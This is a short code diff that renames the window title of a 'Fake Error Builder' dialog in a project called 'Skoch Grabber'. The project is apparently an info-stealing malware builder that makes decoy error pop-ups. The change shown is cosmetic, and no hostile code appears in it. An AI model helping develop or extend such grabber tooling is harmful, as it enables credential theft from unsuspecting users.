@@ -642,7 +642,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Skoch Grabber [Fake Error Builder]")
+		self.title("Skoch Grabber MODDED [Fake Error Builder]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("833x563")
